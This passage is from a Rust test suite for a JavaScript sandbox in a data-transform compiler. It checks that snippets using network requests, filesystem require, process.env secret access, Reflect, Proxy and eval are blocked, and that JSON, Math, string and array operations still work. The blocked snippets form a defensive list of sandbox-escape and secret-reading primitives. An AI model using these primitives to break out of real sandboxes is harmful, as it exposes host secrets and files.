        let func = r#"var xhr = new XMLHttpRequest();"#;
        let result = compile_js_function(func, "test_org");
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("XMLHttpRequest"));
    }

    #[test]
    fn test_security_block_require() {
        let func = r#"var fs = require('fs');"#;
        let result = compile_js_function(func, "test_org");
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("require("));
    }

    #[test]
    fn test_security_block_process() {
        let func = r#"process.env.SECRET = "leaked";"#;
        let result = compile_js_function(func, "test_org");
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("process."));
    }

    #[test]
    fn test_security_block_reflect() {
        let func = r#"Reflect.get(Object, 'constructor');"#;
        let result = compile_js_function(func, "test_org");
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("Reflect."));
    }

    #[test]
    fn test_security_block_proxy() {
        let func = r#"var handler = {}; var p = new Proxy(row, handler);"#;
        let result = compile_js_function(func, "test_org");
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("Proxy("));
    }

    #[test]
    fn test_security_safe_json_operations() {
        // JSON operations should still work (allowed in Context::base())
        let func = r#"
            row.jsonString = JSON.stringify({ test: "value" });
            row.jsonParsed = JSON.parse('{"key": "value"}');
        "#;
        let result = compile_js_function(func, "test_org");
        assert!(result.is_ok(), "JSON operations should be allowed");
    }

    #[test]
    fn test_security_safe_math_operations() {
        // Math operations should still work (allowed in Context::base())
        let func = r#"
            row.sqrt = Math.sqrt(16);
            row.max = Math.max(1, 2, 3);
            row.random = Math.random();
        "#;
        let result = compile_js_function(func, "test_org");
        assert!(result.is_ok(), "Math operations should be allowed");
    }

    #[test]
    fn test_security_safe_string_operations() {
        // String operations should still work (allowed in Context::base())
        let func = r#"
            row.upper = (row.name || "").toUpperCase();
            row.lower = (row.name || "").toLowerCase();
            row.split = (row.csv || "").split(",");
        "#;
        let result = compile_js_function(func, "test_org");
        assert!(result.is_ok(), "String operations should be allowed");
    }

    #[test]
    fn test_security_safe_array_operations() {
        // Array operations should still work (allowed in Context::base())
        let func = r#"
            row.mapped = [1, 2, 3].map(function(x) { return x * 2; });
            row.filtered = [1, 2, 3].filter(function(x) { return x > 1; });
            row.reduced = [1, 2, 3].reduce(function(acc, x) { return acc + x; }, 0);
        "#;
        let result = compile_js_function(func, "test_org");
        assert!(result.is_ok(), "Array operations should be allowed");
    }

    #[test]
    fn test_security_memory_limit_enforcement() {
        // Test that memory limit is actually set
        // Note: We can't easily trigger OOM in a test, but we can verify
        // the runtime is configured properly by ensuring it compiles/runs normally
        let func = r#"
            // Create a reasonably sized object (well under 10MB limit)
            row.data = [];
            for (var i = 0; i < 1000; i++) {
                row.data.push({ index: i, value: "test" });
            }
        "#;
        let config = compile_js_function(func, "test_org");
        assert!(
            config.is_ok(),
            "Normal memory usage should work within limits"
        );

        let config = config.unwrap();
        let input = json!({"original": "value"});
        let (output, error) = apply_js_fn(&config, input, "test_org", &["test_stream".to_string()]);

        assert!(error.is_none());
        let data = output["data"].as_array().unwrap();
        assert_eq!(data.len(), 1000);
    }

    #[test]
    fn test_security_context_base_removes_dangerous_globals() {
        // Test that dangerous globals are not available in Context::base()
        // This test verifies Phase 2 security: Context::base() removes eval, Function, etc.

        // Try to use eval (should fail at runtime if not caught by pattern blocking)
        let func_eval = r#"
            try {
                // This should fail because eval is not available in Context::base()
                // But our pattern blocking should catch it first
                row.result = eval("1 + 1");
            } catch(e) {
                row.error = "eval not available";
            }
        "#;

        // Should be blocked by pattern matching first
        let result = compile_js_function(func_eval, "test_org");
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("eval("));
    }
}
